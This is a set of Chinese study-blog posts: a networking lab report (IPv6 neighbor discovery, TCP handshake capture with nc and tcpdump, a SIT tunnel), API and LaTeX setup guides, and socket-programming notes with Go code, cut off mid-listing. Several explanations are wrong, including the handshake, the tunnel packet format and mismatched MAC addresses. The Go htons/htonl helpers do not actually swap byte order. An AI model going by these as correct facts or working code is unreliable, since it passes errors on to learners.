目标地址：fe80::f816:3eff:fee7:1aea 请求类型：Who has 这些信息用于查询目标地址的邻居节点。\n邻居通告 (NA) 报文通告了以下信息：\n源地址：fe80::f816:3eff:fee7:1aea 目标地址：fe80::f816:3eff:fea7:a942 链路层地址：fa:16:3e:5b:1a:ea 可达性：可达 这些信息用于告知源地址，目标地址是可达的，并且目标地址的链路层地址是 fa:16:3e:e7:f7:b3。 TCP 三次握手 netcat 可以在主机间建立 TCP 连接，建立连接时，可以用 tcpdump 对 报文抓包，观察到 TCP 的三次握手过程。\n首先在 S 的终端 1 中执行 nc -l 1958 侦听 1958 端口。\n之后在 HostA 的终端1 执行 sudo tcpdump -vxn host HostA 的 IPv4(ens5) 地址 andS 的 IPv4(ens5) 地址 -i ens5\n在HostA 的终端2 执行 nc S 的IPv4(ens5)地址 1958。\n命令解释 nc -l 1958：这个命令使用nc（netcat）工具在本地监听1958端口，等待接收数据。 sudo tcpdump -vxn host HostA 的 IPv4(ens5) 地址 andS 的 IPv4(ens5) 地址 -i ens5：这个命令是用来使用tcpdump工具来捕获网络数据包的命令。其中\u0026quot;-v\u0026quot;表示详细模式，\u0026quot;-x\u0026quot;表示以十六进制和ASCII格式显示数据包，\u0026quot;-n\u0026quot;表示以数字形式显示地址，\u0026quot;-i ens5\u0026quot;表示监听网络接口ens5上的数据包。\u0026ldquo;host HostA 的 IPv4(ens5) 地址 andS 的 IPv4(ens5) 地址\u0026quot;这部分应该是要指定要捕获的数据包的源和目标主机的IP地址。 nc S 的IPv4(ens5)地址 1958：这个命令使用nc（netcat）工具来连接到指定的IPv4地址的主机的1958端口。 结果 【实验要求】：完整记录 HostA 的终端 1 中观察到的前三个报文，即 TCP 握手报文。标注出每个报文的类型（SYN、SYN/ACK、ACK）。简要说明 TCP 协议采用三次握手的原因。说明实验中为何无法抓到 RST 包？请问编写应用程序时我们是否需要处理这些报文，为什么？\nTCP 协议采用三次握手的原因\n确保连接的建立是可靠的。 避免已建立的连接被重复建立。 避免连接被恶意攻击。 在三次握手的过程中，双方主机各发送一个 SYN 报文，然后再各发送一个 ACK 报文。这样，双方主机就可以确认对方是可靠的，并且连接是可靠的。\n实验中无法抓到 RST 包的原因\n在实验中，HostA 和 HostB 建立了 TCP 连接，并开始传输数据。如果 HostA 或 HostB 想要终止连接，则会发送 RST 包。但是，由于实验中我们没有终止连接，因此无法抓到 RST 包。\n如果 HostA 发送了一个无效的 TCP 报文，或者 HostB 拒绝建立连接，则 HostB 可能会发送 RST 包来终止连接。在这种情况下，可以通过 tcpdump 来抓到 RST 包。\n编写应用程序时是否需要处理这些报文\n编写应用程序时，通常不需要直接处理 TCP 握手报文。应用程序可以通过调用系统 API 来建立和管理 TCP 连接。\n隧道 注意 隧道删除命令为 ip tunnel del 隧道名称，若添加隧道命令打错可用此命令删除后重建。\n打开两个 Host 虚拟机并各打开一个终端 在 HostA 的终端上执行命令： sudo ip tunnel add sit1 mode sit remote HostB 的 IPv4 地址 local HostA 的 IPv4 地址 dev ens5（IPv4 地址可以由命令 ifconfig ens5 获得）\nsudo ip link set sit1 up\nip link show up【记录结果，此时可以看到名字为 sit1 的设备】 sudo ip addr add 3ffe:3216:2101:2106:1234::A/80 dev sit1\nip tunnel show【记录结果】 命令解释 sudo ip tunnel add sit1 mode sit remote HostB 的 IPv4 地址 local HostA 的 IPv4 地址 dev ens5：该命令用于创建一个名为 sit1 的隧道接口，该隧道接口的模式为 SIT，远程端地址为 HostB 的 IPv4 地址，本地端地址为 HostA 的 IPv4 地址，隧道接口绑定的物理接口为 ens5。\nsudo ip link set sit1 up：HostA 已经创建了名为 sit1 的隧道接口，但该隧道接口处于禁用状态。通过执行该命令，将 sit1 隧道接口置为启用状态。\nip link show 命令用于显示系统的网络接口信息，包括其当前状态。up 选项只显示当前已启用的网络接口。\nsudo ip addr add 3ffe:3216:2101:2106:1234::A/80 dev sit1 ：该命令用于将 IPv6 地址 3ffe:3216:2101:2106:1234::A 分配给隧道接口 sit1，前缀长度为 80\nip tunnel show 用于显示系统中所有隧道接口的信息。\n在 HostB 的终端上执行命令： sudo ip tunnel add sit1 mode sit remote HostA 的 IPv4 地址 local HostB 的 IPv4 地址 dev ens5（IPv4 地址可以由命令 ifconfig ens5 获得）\nsudo ip link set sit1 up\nip link show up【记录结果，此时可以看到名字为 sit1 的设备】 sudo ip addr add 3ffe:3216:2101:2106:1234::B/80 dev sit1\nip tunnel show【记录结果】 命令解释 sudo ip tunnel add sit1 mode sit remote HostA 的 IPv4 地址 local HostB 的 IPv4 地址 dev ens5 用于创建一个名为 sit1 的隧道接口。该隧道接口使用 SIT 模式，远程端地址为 HostA 的 IPv4 地址，本地端地址为 HostB 的 IPv4 地址。隧道接口绑定到物理接口 ens5。\nsudo ip link set sit1 up ：通过执行该命令，将 sit1 隧道接口置为启用状态。\nip link show 命令用于显示系统的网络接口信息，包括其当前状态。up 选项只显示当前已启用的网络接口。\nsudo ip addr add 3ffe:3216:2101:2106:1234::B/80 dev sit1 用于将 IPv6 地址 3ffe:3216:2101:2106:1234::B 分配给隧道接口 sit1，前缀长度为 80。\nip tunnel show 用于显示系统中所有隧道接口的信息。\n在 HostA 上打开两个终端。 其中一个终端用 tcpdump 侦听报文，另一个终端用于 ping6。\n首先在 HostA 的第 1 个终端中执行命令 sudo tcpdump -vxn -i sit1。\n其次在 HostA 的第 2 个终端中执行命令 ping6 –c 1 3ffe:3216:2101:2106 :1234::B，检查是否可以 ping 通，若不通则需要检查之前的步骤是否正确完成。 记录 HostA 的第 1 个终端中由 tcpdump 抓取的前两个报文。 关闭 HostA 的这两个终端并重新打开两个新的终端。\n在 HostA 的第 1 个终端中执行命令 sudo tcpdump -vxn –i ens5\n在 HostA 的第 2 个终端中执行命令 ping6 –c 1 3ffe:3216:2101:2106:1234::B。 记录 HostA 的第 1 个终端中由 tcpdump 抓取的前两个报文（可能要等一会儿）。 命令解释 sudo tcpdump -vxn -i sit1 用于捕获在隧道接口 sit1 上传输的网络数据包。\nping6 –c 1 3ffe:3216:2101:2106:1234::B该命令将向 IPv6 地址 3ffe:3216:2101:2106:1234::B 发送一个 ICMP 回显请求数据包。如果该地址可达，则目标主机将会响应一个 ICMP 回显应答数据包。\n结果解释 【实验要求】：记录需要记录的实验数据。从报文结构上看，通过隧道通信与两个 IPv6 主机直接通信的区别是什么，即上述隧道通信的报文有什么特点？\n通过隧道通信与两个 IPv6 主机直接通信的区别是什么：\n隧道通信的报文中，IPv6 头部包含了源地址和目标地址，以及隧道协议类型。两个 IPv6 主机直接通信的报文中，IPv6 头部只包含了源地址和目标地址。 隧道通信的报文中，包含了隧道协议头部，用于描述隧道连接的相关信息。两个 IPv6 主机直接通信的报文中，没有隧道协议头部。 ","date":"2023-11-20T10:27:05+08:00","permalink":"https://anonymity-0.github.io/posts/%E4%BF%A1%E7%BD%91%E5%AE%9E%E9%AA%8C2/","title":"信网实验2"},{"content":"项目地址 GitHub - binary-husky/gpt_academic: 为ChatGPT/GLM提供实用化交互界面，特别优化论文阅读/润色/写作体验，模块化设计，支持自定义快捷按钮\u0026amp;函数插件，支持Python和C++等项目剖析\u0026amp;自译解功能，PDF/LaTex论文翻译\u0026amp;总结功能，支持并行问询多种LLM模型，支持chatglm2等本地模型。兼容文心一言, moss, llama2, rwkv, claude2, 通义千问, 书生, 讯飞星火等。\napi配置 openai-api 因为已经有了gpt账户，所以直接在OpenAI Platform上生成一个key就可以了。注意这个key只能看一次。 azure-api 注册 因为注册azure本身需要信用卡，本来不想注册的，突然看到一个博客说azure学生认证之后可以不需要信用卡，试了一下果然可以。注册之后秒通过，科大邮箱还是靠谱的。 注册可以参考学生福利白嫖之路——申请Azure学生订阅 - 知乎\n配置 在搜索栏搜索Openai，然后创建 请求访问Azure OpenAI服务 然后填写问卷，第四个问题需要填写订阅ID， 参考： 获取 Azure 门户中的订阅和租户 ID - Azure portal | Microsoft Learn\n填完问卷之后要等一段时间的审核 星火api 登陆：讯飞开放平台 点击免费试用： 实名认证获得更多token 前往控制台-讯飞开放平台获取自己的key 输入到config.py中 注：需在这个列表添加 智谱清言 前往平台智谱AI开放平台登陆后前往 点击右上角查看apikey 复制key输入config.py的这个部分： 其他api不是需要自己部署就是收费，就不捣鼓了。\n","date":"2023-11-18T17:09:33+08:00","permalink":"https://anonymity-0.github.io/posts/gpt-academic%E6%9C%AC%E5%9C%B0%E9%85%8D%E7%BD%AE/","title":"Gpt Academic本地配置"},{"content":"最近开始要写课程论文了，想着要用latex的模板直接写会方便，又懒得下overleaf，话不多说开始配置\n下载与安装 可以从该镜像下载 [Index of CTAN-local/systems/texlive/Images](https://mirrors.huaweicloud.com/CTAN/systems/texlive/Images/\nmac用户可配置MacTeX - TeX Users Group\n安装vscode插件 LaTeX Workshop\n配置 配置latex-workshop 不包含外部 pdf 查看器设置的配置\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 \u0026#34;latex-workshop.latex.autoBuild.run\u0026#34;: \u0026#34;never\u0026#34;, \u0026#34;latex-workshop.showContextMenu\u0026#34;: true, \u0026#34;latex-workshop.intellisense.package.enabled\u0026#34;: true, \u0026#34;latex-workshop.message.error.show\u0026#34;: false, \u0026#34;latex-workshop.message.warning.show\u0026#34;: false, \u0026#34;latex-workshop.latex.tools\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;xelatex\u0026#34;, \u0026#34;command\u0026#34;: \u0026#34;xelatex\u0026#34;, \u0026#34;args\u0026#34;: [ \u0026#34;-synctex=1\u0026#34;, \u0026#34;-interaction=nonstopmode\u0026#34;, \u0026#34;-file-line-error\u0026#34;, \u0026#34;%DOCFILE%\u0026#34; ] }, { \u0026#34;name\u0026#34;: \u0026#34;pdflatex\u0026#34;, \u0026#34;command\u0026#34;: \u0026#34;pdflatex\u0026#34;, \u0026#34;args\u0026#34;: [ \u0026#34;-synctex=1\u0026#34;, \u0026#34;-interaction=nonstopmode\u0026#34;, \u0026#34;-file-line-error\u0026#34;, \u0026#34;%DOCFILE%\u0026#34; ] }, { \u0026#34;name\u0026#34;: \u0026#34;latexmk\u0026#34;, \u0026#34;command\u0026#34;: \u0026#34;latexmk\u0026#34;, \u0026#34;args\u0026#34;: [ \u0026#34;-synctex=1\u0026#34;, \u0026#34;-interaction=nonstopmode\u0026#34;, \u0026#34;-file-line-error\u0026#34;, \u0026#34;-pdf\u0026#34;, \u0026#34;-outdir=%OUTDIR%\u0026#34;, \u0026#34;%DOCFILE%\u0026#34; ] }, { \u0026#34;name\u0026#34;: \u0026#34;bibtex\u0026#34;, \u0026#34;command\u0026#34;: \u0026#34;bibtex\u0026#34;, \u0026#34;args\u0026#34;: [ \u0026#34;%DOCFILE%\u0026#34; ] } ], \u0026#34;latex-workshop.latex.recipes\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;XeLaTeX\u0026#34;, \u0026#34;tools\u0026#34;: [ \u0026#34;xelatex\u0026#34; ] }, { \u0026#34;name\u0026#34;: \u0026#34;PDFLaTeX\u0026#34;, \u0026#34;tools\u0026#34;: [ \u0026#34;pdflatex\u0026#34; ] }, { \u0026#34;name\u0026#34;: \u0026#34;BibTeX\u0026#34;, \u0026#34;tools\u0026#34;: [ \u0026#34;bibtex\u0026#34; ] }, { \u0026#34;name\u0026#34;: \u0026#34;LaTeXmk\u0026#34;, \u0026#34;tools\u0026#34;: [ \u0026#34;latexmk\u0026#34; ] }, { \u0026#34;name\u0026#34;: \u0026#34;xelatex -\u0026gt; bibtex -\u0026gt; xelatex*2\u0026#34;, \u0026#34;tools\u0026#34;: [ \u0026#34;xelatex\u0026#34;, \u0026#34;bibtex\u0026#34;, \u0026#34;xelatex\u0026#34;, \u0026#34;xelatex\u0026#34; ] }, { \u0026#34;name\u0026#34;: \u0026#34;pdflatex -\u0026gt; bibtex -\u0026gt; pdflatex*2\u0026#34;, \u0026#34;tools\u0026#34;: [ \u0026#34;pdflatex\u0026#34;, \u0026#34;bibtex\u0026#34;, \u0026#34;pdflatex\u0026#34;, \u0026#34;pdflatex\u0026#34; ] }, ], \u0026#34;latex-workshop.latex.clean.fileTypes\u0026#34;: [ \u0026#34;*.aux\u0026#34;, \u0026#34;*.bbl\u0026#34;, \u0026#34;*.blg\u0026#34;, \u0026#34;*.idx\u0026#34;, \u0026#34;*.ind\u0026#34;, \u0026#34;*.lof\u0026#34;, \u0026#34;*.lot\u0026#34;, \u0026#34;*.out\u0026#34;, \u0026#34;*.toc\u0026#34;, \u0026#34;*.acn\u0026#34;, \u0026#34;*.acr\u0026#34;, \u0026#34;*.alg\u0026#34;, \u0026#34;*.glg\u0026#34;, \u0026#34;*.glo\u0026#34;, \u0026#34;*.gls\u0026#34;, \u0026#34;*.ist\u0026#34;, \u0026#34;*.fls\u0026#34;, \u0026#34;*.log\u0026#34;, \u0026#34;*.fdb_latexmk\u0026#34; ], \u0026#34;latex-workshop.latex.autoClean.run\u0026#34;: \u0026#34;onFailed\u0026#34;, \u0026#34;latex-workshop.latex.recipe.default\u0026#34;: \u0026#34;lastUsed\u0026#34;, \u0026#34;latex-workshop.view.pdf.internal.synctex.keybinding\u0026#34;: \u0026#34;double-click\u0026#34; SumatraPDF 安装设置 因为vscode内置的pdf查看器不太好用，可以配置别的pdf查看器。具体配置参考Visual Studio Code (vscode)配置LaTeX - 知乎\n常用latex模板 科大学位论文模板：GitHub - ustctug/ustcthesis: LaTeX template for USTC thesis 国科大学位论文模板：GitHub - mohuangrui/ucasthesis: LaTeX Thesis Template for the University of Chinese Academy of Sciences 国科大大作业论文模板：GitHub - jweihe/UCAS_Latex_Template: 中国科学院大学通用课程大作业模板 ","date":"2023-11-15T21:32:47+08:00","permalink":"https://anonymity-0.github.io/posts/vscode%E9%85%8D%E7%BD%AElatex/","title":"VScode配置Latex"},{"content":"3.1 分配给套接字的IP地址与端口号 网络地址 略\n用于区分套接字的端口号 IP用于区分计算机,只要有IP地址就能向目标主机传输数据,但仅凭这些无法传输给最终的应用程序。假设各位欣赏视频的同时在网上冲浪,这时至少需要1个接收视频数据的套接字和1 个接收网页信息的套接字。问题在于如何区分二者。简言之,传输到计算机的网络数据是发给播放器,还是发送给浏览器?\n若想接收多台计算机发来的数据,则需要相应个数的套接字。那如何区分这些套接字呢? 计算机中一般配有NIC(Network Interface Card,网络接口卡)数据传输设备。通过NIC向计算机内部传输数据时会用到IP。操作系统负责把传递到内部的数据适当分配给套接字,利用端口号。也就是说,通过NIC接收的数据内有端口号,操作系统正是参考此端口号把数据传输给相应端口的套接字 端口号就是在同一操作系统内为区分不同套接字而设置的,因此无法将1个端口号分配给不同套接字。 另外,端口号由16位构成 可分配的端口号范围是0-65535。但0-1023是知名端口(Well-known PORT),一般分配给特定应用程序,所以应当分配此范围之外的值。另外,虽然端口号不能重复,但TCP套接字和UDP套接字不会共用端口号,所以允许重复。例如:如果某TCP 套接字使用9190号端口,则其他TCP套接字就无法使用该端口号,但UDP套接字可以使用。 总之,数据传输目标地址同时包含IP地址和端口号,只有这样,数据才会被传输到最终的目的应用程序(应用程序套接字)。\n3.2 应用程序中使用的IP地址和端口号以结构体的形式给出了定义。本节将以IPv4为中心,围绕此结构体讨论目标地址的表示方法。\n表示IPv4的结构体 填写地址信息时应以如下提问为线索进行\n口 问题1：“采用哪一种地址族？” 口 答案1：“基于IPv4的地址族。” 口问题2：“IP地址是多少？” 口答案2：“211.204.214.76。” 口 问题3：“端口号是多少？” 口 答案3：“2048。” C C语言中IPv4结构体定义为如下形态\n1 2 3 4 5 6 7 struct sockaddr_in { sa_family_t sin_family; //地址族 uint16_t sin_port; //16位TCP/UDP地址 struct in_addr sin_addr; //32位ip地址 char sin_zero[8]; //不使用 }; in_addr定义如下，它用来存放32位IP地址\n1 2 3 4 struct in_addr { In_addr_t s_addr; //32位IPv4地址 } 可以看到 in_addr_t 实际上是 uint32_t也就是无符号32位bit，那为什么需要额外定义这些数据类型呢? 如前所述,这是考虑到扩展性的结果。如果使用int32_t类型的数据,就能保证在任何时候都占用4字节,即使将来用64位表示int类型也是如此。 从之前介绍的代码也可看出,sockaddr_in结构体变量地址值将以如下方式传递给bind函数。\n1 2 3 4 5 struct sockaddr_in serv_addr; ... if(bind(serv_sock,(struct sockaddr * ) \u0026amp;serv_addr, sizeof(Serv_addr))== -1) error_handling(\u0026#34;bind()error\u0026#34;); ... 此处重要的是第二个参数的传递。实际上,bind函数的第二个参数期望得到sockaddr结构体变量地址值,包括地址族、端口号、IP地址等。（此处进行了强制类型转换,将sockaddr_in转成sockaddr）从下列代码也可看出,直接向sockaddr结构体填充这些信息会带来麻烦。\n1 2 3 4 struct sockaddr { sa_family_t char sin_family;//地址族(Address Family) sa_data[14];// 地址信息 } 此结构体成员sa_data保存的地址信息中需包含IP地址和端口号,剩余部分应填充0,这也是bind函数要求的。而这对于包含地址信息来讲非常麻烦,继而就有了新的结构体sockaddr_in。若按照之前的讲解填写sockaddr_in结构体,则将生成符合bind函数要求的字节流。最后转换为sockaddr型的结构体变量,再传递给bind函数即可。\nsin_family 每种协议族适用的地址族均不同。比如,IPv4使用4字节地址族,IPv6使用16字节地址族。 可以参考表3-2保存sin_family地址信息。 sockaddr_in是保存IPv4地址信息的结构体。那为何还需要通过sin_family单独指定地址族信息呢? 这与之前讲过的sockaddr结构体有关。结构体sockaddr并非只次IPv4设计, 这从保存地址信息的数组sa_data长度为14字节也可看出。因此,结构体sockaddr要求在sin_family 中指定地址族信息。为了与sockaddr保持一致,sockaddr_in结构体中也有地址族信息。\nsin_port 该成员保存16位端口号,重点在于,它以网络字节序保存\nsin_addr 该成员保存32位IP地址信息,且也以网络字节序保存。为理解好该成员,应同时观察结构体in_addr。但结构体in_addr声明为uint32_t,因此只需当作32位整数型即可。\nsin_zero 无特殊含义。只是 使结构体sockaddr_in的大小与sockadd结构体保持一致而插入的成员。 必需填充为0,否则无法得到想要的结果。\ngo 在 Go 语言中，类似于 C 语言中 struct sockaddr_in 的结构体是 syscall.SockaddrInet4（对于 IPv4）和 syscall.SockaddrInet6（对于 IPv6）。\n在go中，就没有特别定义in_addr_t，直接使用[4]byte。\n1 2 3 4 5 6 // SockaddrInet4 结构体用于表示一个 IPv4 网络地址。 type SockaddrInet4 struct { Port int // Port 字段表示端口号 Addr [4]byte // Addr 字段表示 IPv4 地址，存储为 4 字节 raw RawSockaddrInet4 // raw 字段是内部使用的原始结构体，用于与系统调用交互 } Port：一个 int 类型的值，表示网络地址的端口号。\nAddr：一个 [4]byte 类型的数组，表示 IPv4 地址。每个字节代表地址的一部分，例如，地址 \u0026ldquo;127.0.0.1\u0026rdquo; 会被表示为 [127, 0, 0, 1]。\nraw：一个 RawSockaddrInet4 类型的值，表示网络地址的底层表示。这个字段通常由系统调用使用，不应在常规 Go 代码中直接使用\nRawSockaddrInet4\n1 2 3 4 5 6 7 8 // RawSockaddrInet4 结构体用于表示一个 IPv4 网络地址的底层结构。 type RawSockaddrInet4 struct { Len uint8 // Len 字段表示此结构体的长度 Family uint8 // Family 字段表示地址族，对于 IPv4，此值通常为 AF_INET Port uint16 // Port 字段表示端口号 Addr [4]byte // Addr 字段表示 IPv4 地址，存储为 4 字节 Zero [8]int8 // Zero 字段是填充字段，用于确保结构体的大小正确 } Go语言也类似，这是go 的bind函数\n1 2 3 4 5 6 7 func Bind(fd int, sa Sockaddr) (err error) { ptr, n, err := sa.sockaddr() if err != nil { return err } return bind(fd, ptr, n) } 在 Go 语言中，syscall.Bind 函数的第二个参数是 Sockaddr 类型，这是一个接口类型，它定义了一些方法，这些方法需要由任何实现该接口的类型来实现。\nSockaddrInet4 和 SockaddrInet6 结构体都实现了 Sockaddr 接口，因此它们可以作为 syscall.Bind 函数的参数。\n当你创建一个 SockaddrInet4 结构体并传递给 syscall.Bind 函数时，Go 语言会自动将 SockaddrInet4 结构体转换为 Sockaddr 接口类型，然后再传递给 syscall.Bind 函数。\n所以，虽然 syscall.Bind 函数的参数类型是 Sockaddr，但你可以传递一个 *SockaddrInet4 或 *SockaddrInet6 结构体给它。\nLen：一个 uint8 类型的值，表示此结构体的长度。\nFamily：一个 uint8 类型的值，表示地址族。对于 IPv4，此值通常为 AF_INET。\nFamily 字段在 RawSockaddrInet4 结构体中用于指定地址族。对于 IPv4 地址，这个字段通常被设置为 AF_INET。 虽然 RawSockaddrInet4 结构体通常用于表示 IPv4 地址，但 Family 字段仍然是必要的，因为它告诉操作系统如何解释这个结构体中的其他字段。例如，Port 和 Addr 字段的解释方式取决于 Family 字段的值。 此外，Family 字段也可以帮助调试和错误检查。例如，如果你看到一个 Family 字段的值不是 AF_INET，但结构体是 RawSockaddrInet4，那么你就知道有些地方出错了。\nPort：一个 uint16 类型的值，表示网络地址的端口号。注意，这个值是网络字节序。\nAddr：一个 [4]byte 类型的数组，表示 IPv4 地址。每个字节代表地址的一部分，例如，地址 \u0026ldquo;127.0.0.1\u0026rdquo; 会被表示为 [127, 0, 0, 1]。\nZero：一个 [8]int8 类型的数组，用于填充，以确保结构体的大小正确。这个字段通常不用于常规编程。（类似sin_zero）\nSockaddrInet4 和 RawSockaddrInet4 两个结构体都包含 Port 和 Addr 字段，但它们的用途是不同的。\nSockaddrInet4 是 Go 语言对网络地址的高级表示，它的 Port 和 Addr 字段类型分别为 int 和 [4]byte，这对于 Go 程序员来说更易于使用。\n而 RawSockaddrInet4 是对系统调用级别的网络地址的低级表示，它的 Port 和 Addr 字段类型分别为 uint16 和 [4]byte，并且 Port 字段是网络字节序，这对于系统调用来说是必须的。\n当你在 Go 代码中创建一个 SockaddrInet4 结构体并传递给如 syscall.Bind 这样的函数时，Go 语言会自动将 SockaddrInet4 结构体转换为 RawSockaddrInet4 结构体，然后再传递给底层的系统调用。这就是为什么 SockaddrInet4 结构体中包含一个 RawSockaddrInet4 字段的原因。\nSockaddrInet4结构体包含了IPv4地址和端口信息，而RawSockaddrInet4结构体则是为了在底层网络编程中使用原始的套接字地址结构而定义的。这种设计可以让网络编程在不同层次上进行操作，同时保持灵活性和可扩展性。\n3.3 网络字节序与地址变换 不同CPU中,4字节整数型值1在内存空间的保存方式是不同的。4字节整数型值1可用2进制表示如下。 00000000 00000000 00000000 00000001 有些CPU以这种顺序保存到内存,另外一些CPU则以倒序保存。 00000001 00000000 00000000 00000000 若不考虑这些就收发数据则会发生问题,因为保存顺序的不同意味着对接收数据的解析顺序也不同。\n字节序与网络字节序 CPU向内存保存数据的方式有2种,这意味着CPU解析数据的方式也分为2种。\n大端序(Big Endian):高位字节存放到低位地址。 小端序(Little Endian):高位字节存放到高位地址。 每种CPU的数据保存方式均不同。因此, 代表CPU数据保存方式的主机字节序(Host Byte Order)在不同CPU中也各不相同。目前主流的Intel系列CPU以小端序方式保存数据。接下来分析2台字节序不同的计算机之间数据传递过程中可能出现的问题 0x12和0x34构成的大端序系统值与0x34和0x12构成的小端序系统值相同。换言之,只有改变数据保存顺序才能被识别为同一值。图3-6中,大端序系统传输数据0x1234时未考虑字节序问题, 而直接以Ox12、0x34的顺序发送。结果接收端以小端序方式保存数据,因此小端序接收的数据变成0x3412,而非0x1234。正因如此,在通过网络传输数据时约定统一方式,这种约定称为网络字节序(Network Byte Order) 非常简单：统一为大端序。 即,先把数据数组转化成大端序格式再进行网络传输。因此,所有计算机接收数据时应识别该数据是网络字节序格式,小端序系统传输数据时应转化为大端序排列方式。 字节序转换 接下来介绍帮助转换字节序的函数。这是文中给的c语言转换函数 在 Go 语言中，没有内置的 htons（Host TO Network Short）、ntohs（Network TO Host Short）、htonl（Host TO Network Long）和 ntohl（Network TO Host Long）函数。这些函数在 C 语言中用于在主机字节序和网络字节序之间转换数据。\n但是，你可以使用 Go 语言的 encoding/binary 包来实现同样的功能。以下是如何在 Go 语言中实现这些函数的例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 package main import ( \u0026#34;encoding/binary\u0026#34; \u0026#34;fmt\u0026#34; ) func htons(n uint16) uint16 { var b [2]byte binary.BigEndian.PutUint16(b[:], n) return binary.BigEndian.Uint16(b[:]) } func ntohs(n uint16) uint16 { return htons(n) // 在 16 位无符号整数上，ntohs 和 htons 是相同的 } func htonl(n uint32) uint32 { var b [4]byte binary.BigEndian.PutUint32(b[:], n) return binary.BigEndian.Uint32(b[:]) } func ntohl(n uint32) uint32 { return htonl(n) // 在 32 位无符号整数上，ntohl 和 htonl 是相同的 } func main() { fmt.Println(htons(12345)) // 输出：12345 fmt.Println(ntohs(12345)) // 输出：12345 fmt.Println(htonl(12345)) // 输出：12345 fmt.Println(ntohl(12345)) // 输出：12345 } endian_conv.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 package main import ( \u0026#34;encoding/binary\u0026#34; \u0026#34;fmt\u0026#34; ) // htons 函数接收一个 uint16 类型的主机字节序值， // 将其转换为网络字节序，然后返回转换后的值。 func htons(n uint16) uint16 { b := make([]byte, 2) // 创建一个长度为 2 的字节数组 binary.BigEndian.PutUint16(b, n) // 将 n 的值以大端字节序放入字节数组 return binary.BigEndian.Uint16(b) // 从字节数组中读取并返回大端字节序的值 } // htonl 函数接收一个 uint32 类型的主机字节序值， // 将其转换为网络字节序，然后返回转换后的值。 func htonl(n uint32) uint32 { b := make([]byte, 4) // 创建一个长度为 4 的字节数组 binary.BigEndian.PutUint32(b, n) // 将 n 的值以大端字节序放入字节数组 return binary.BigEndian.Uint32(b) // 从字节数组中读取并返回大端字节序的值 } func main() { hostPort := uint16(0x1234) // 定义一个主机字节序的端口值 hostAddr := uint32(0x12345678) // 定义一个主机字节序的地址值 netPort := htons(hostPort) // 将主机字节序的端口值转换为网络字节序 netAddr := htonl(hostAddr) // 将主机字节序的地址值转换为网络字节序 3.4 网络地址的初始化与分配 将字符串信息转换为网络字节序的整数型 sockaddr_in中保存地址信息的成员为32位整数型。因此,为了分配IP地址,需要将其表示为32位整数型数据。这对于只熟悉字符串信息的我们来说实非易事。\n对于IP地址的表示,我们熟悉的是点分十进制表示法(Dotted Decimal Notation),而非整数型数据表示法。幸运的是,有个函数会帮我们将字符串形式的IP地址转换成32位整数型数据。此函数在转换类型的同时进行网络字节序转换。\ninet_addr 1 2 3 #include \u0026lt;arpa/inet.h\u0026gt; in_addr_t inet_addr(const char * string); //成功时返回32位大端序整数型值,失败时返回 INADDR_NONE。 如果向该函数传递类似“211.214.107.99”的点分十进制格式的字符串,它会将其转换为32 位整数型数据并返回。当然,该整数型值满足网络字节序。另外,该函数的返回值类型in_addr_t 在内部声明为32位整数型。\n在 Go 中，你可以使用 net 包的 ParseIP 函数来解析 IP 地址。这个函数可以处理 IPv4 和 IPv6 地址，如果输入的字符串不是有效的 IP 地址，它会返回 nil。然后，你可以使用 encoding/binary 包的 BigEndian.Uint32 或 LittleEndian.Uint32 函数将 net.IP 类型的 IP 地址转换为网络字节序或主机字节序的整数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 package main import ( \u0026#34;encoding/binary\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;net\u0026#34; ) func main() { ip := net.ParseIP(\u0026#34;1.2.3.4\u0026#34;) if ip == nil { fmt.Println(\u0026#34;Invalid IP address\u0026#34;) return } ip = ip.To4() if ip == nil { fmt.Println(\u0026#34;Not an IPv4 address\u0026#34;) return } fmt.Printf(\u0026#34;IP as integer (network byte order): %x\\n\u0026#34;, binary.BigEndian.Uint32(ip)) fmt.Printf(\u0026#34;IP as integer (host byte order): %x\\n\u0026#34;, binary.LittleEndian.Uint32(ip)) } inter_addr.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 package main import ( \u0026#34;encoding/binary\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;net\u0026#34; ) const INADDR_NONE = 0xffffffff // inet_addr converts an IPv4 address in dot-decimal notation into a 32-bit integer in network byte order. // If the IP address is invalid, it returns INADDR_NONE (0xffffffff). func inet_addr(ipStr string) uint32 { ip := net.ParseIP(ipStr) if ip == nil { return 0xffffffff } ip = ip.To4() if ip == nil { return 0xffffffff } return binary.BigEndian.Uint32(ip) } func main() { addr1 := \u0026#34;1.2.3.4\u0026#34; addr2 := \u0026#34;1.2.3.256\u0026#34; conv_addr := inet_addr(addr1) if conv_addr == INADDR_NONE { fmt.Println(\u0026#34;Error occured!\u0026#34;) } else { fmt.Printf(\u0026#34;Network ordered integer addr: %#x\\n\u0026#34;, conv_addr) } conv_addr = inet_addr(addr2) if conv_addr == INADDR_NONE { fmt.Println(\u0026#34;Error occured!\u0026#34;) } else { fmt.Printf(\u0026#34;Network ordered integer addr: %#x\\n\u0026#34;, conv_addr) } } inet_aton inet_aton函数 与inet_addr函数在功能上完全相同,也将字符串形式IP地址转换为32位网络字节序整数并返回。只不过该函数利用了in_addr结构体,且其使用频率更高。\n1 2 3 4 5 #include \u0026lt;arpa/inet.h\u0026gt; int inet_aton(const char * string,struct in_addn * addn); //成功时返回1(true),失败时返回 0(false)。 //string 含有需转换的IP地址信息的字符串地址值。 //addr 将保存转换结果的in_addr结构体变量的地址值。 inet_aton.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 